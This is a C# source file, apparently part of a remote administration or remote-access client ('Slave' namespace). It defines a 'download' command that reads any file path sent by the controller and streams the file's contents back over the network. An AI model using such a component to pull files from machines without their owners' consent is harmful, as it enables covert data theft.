using Shared;
using Slave.Commands.Core;
using System.Collections.Generic;
using System.IO;

namespace Slave.Commands
{
    internal class Download : ICommand
    {
        public string name { get; } = "download";

        public void Process(List<string> args)
        {
            if (!File.Exists(args[0]))
            {
                SlaveCommandsManager.networkManager.WriteLine("NotFound");
                return;
            }

            try
            {
                using (var readStream = new FileStream(args[0], FileMode.Open))
                {
                    SlaveCommandsManager.networkManager.WriteLine("OK");

                    SlaveCommandsManager.networkManager.StreamToNetworkStream(readStream);
                }
            }
            catch (IOException)
            {
                SlaveCommandsManager.networkManager.WriteLine("IOException");
            }
        }
    }
}
